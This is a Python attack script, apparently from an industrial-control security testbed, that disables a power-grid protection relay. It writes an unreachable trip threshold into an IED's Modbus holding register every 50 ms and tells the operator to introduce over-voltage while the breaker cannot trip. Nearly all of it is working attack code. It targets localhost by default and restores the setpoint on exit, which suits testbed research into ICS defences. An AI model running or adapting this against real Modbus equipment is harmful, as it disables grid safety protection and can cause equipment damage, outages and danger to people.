#!/usr/bin/env python3
"""
ATK-06 | Setpoint Manipulation
================================
The PLC protection logic in TRINETRA's Structured Text compares the live
voltage_pu sensor value against a trip threshold: if vm_pu > TRIP_HIGH then
Trip_Command := TRUE.  The default trip threshold is typically 1.10 pu.

This attack raises that threshold to an unreachable value (99 pu by default)
by writing it into the IED's Modbus Holding Register that stores the setpoint
(%MW1 → address 1025).  After the injection:

  • The relay condition is never satisfied regardless of actual fault severity.
  • An attacker can then cause ANY over-voltage without triggering protection.
  • The grid operates completely unprotected.

Register map
------------
  Holding Register 1024 (%MW0) — voltage_pu     × 1000  (read by PLC logic)
  Holding Register 1025 (%MW1) — trip_threshold × 1000  (setpoint, writable)

  Normal setpoint : ~1100  (1.10 pu)
  Attack setpoint : 99000  (99.00 pu) — relay will never trip

⚠  Requires the ST logic to read its threshold FROM %MW1.
   If your ST code has the threshold hard-coded, combine this with a direct
   register-read bypass (see ATK-01) to still force a no-trip condition.

Usage
-----
    python atk06_setpoint_manipulation.py
    python atk06_setpoint_manipulation.py --target 127.0.0.1 --port 5020 --threshold_pu 99 --duration 20
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient


def main():
    parser = argparse.ArgumentParser(
        description="ATK-06: Raise the relay trip-threshold so it never fires."
    )
    parser.add_argument("--target",       type=str,   default="127.0.0.1",
                        help="Target IED IP address")
    parser.add_argument("--port",         type=int,   default=5020,
                        help="Target IED Modbus TCP port  (default 5020 = IED-1)")
    parser.add_argument("--setpoint_reg", type=int,   default=1025,
                        help="Holding Register address of the trip setpoint  (default 1025 = %MW1)")
    parser.add_argument("--threshold_pu", type=float, default=99.0,
                        help="Fake trip threshold in per-unit to write  (default 99.0)")
    parser.add_argument("--duration",     type=float, default=15.0,
                        help="Seconds to sustain the manipulation  (default 15 s)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-06  |  Setpoint Manipulation")
    print("=" * 60)
    print(f"[*] Target IED      : {args.target}:{args.port}")
    print(f"[*] Setpoint reg    : address {args.setpoint_reg}  (%MW1)")
    print(f"[*] Fake threshold  : {args.threshold_pu} pu  →  register value {int(args.threshold_pu * 1000)}")
    print(f"[*] Duration        : {args.duration} s")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect. Is the IED container running?")
        return

    # Read current setpoint first (informational)
    read_result = client.read_holding_registers(args.setpoint_reg, count=1)
    if not read_result.isError():
        current_raw = read_result.registers[0]
        print(f"[*] Current setpoint in register: {current_raw}  ({current_raw / 1000:.3f} pu)")
    else:
        print("[!] Could not read current setpoint — proceeding with write.")

    scaled_threshold = int(args.threshold_pu * 1000)
    deadline  = time.time() + args.duration
    iteration = 0

    print(f"\n[*] Writing manipulated setpoint {args.threshold_pu} pu every 50 ms …")
    try:
        while time.time() < deadline:
            response = client.write_register(args.setpoint_reg, scaled_threshold)
            if response.isError():
                print(f"[-] Write error on iteration {iteration}: {response}")
                break
            iteration += 1
            time.sleep(0.05)

        print(f"\n[+] ATTACK COMPLETE: Setpoint held at {args.threshold_pu} pu for {args.duration} s ({iteration} writes)")
        print("[+] Relay protection was DISABLED — no fault condition could have triggered it.")
        print("[+] Introduce any over-voltage now; the breaker will NOT trip.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        # Restore the normal threshold on exit so the testbed recovers
        normal_threshold = int(1.10 * 1000)   # 1.10 pu = 1100
        restore_resp = client.write_register(args.setpoint_reg, normal_threshold)
        if not restore_resp.isError():
            print(f"[*] Setpoint restored to 1.10 pu ({normal_threshold}) — IED protection re-enabled.")
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
